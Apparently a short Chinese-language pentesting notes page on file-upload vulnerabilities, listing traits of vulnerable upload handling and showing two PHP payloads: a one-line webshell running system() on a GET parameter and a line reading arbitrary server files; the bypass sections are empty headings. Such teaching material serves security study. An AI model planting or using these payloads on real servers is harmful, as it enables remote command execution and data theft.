---
description: 验证存在固有缺陷或者容易被绕过。即使是强大的验证措施也可能在构成网站的主机和网站的文件系统中不一致地应用，从而导致可被利用的差异。
---

# ✔️ 文件上传 - File upload

## 存在漏洞的特征

### 利用不受限制的文件

* [x] 允许上传服务器端脚本文件（PHP / Java / Python）
* [x] 可将这些脚本文件配置为代码执行

### 利用上传验证缺陷





## 常见攻击方式

### 1. 上传webshell

```php
// 通用的Webshell
<?php echo system($_GET['command']); ?>
```



### 2. 后续攻击

```php
// 从服务器的文件系统读取任意文件
<?php echo file_get_contents('/path/to/target/file'); ?>
```

## 绕过上传验证措施

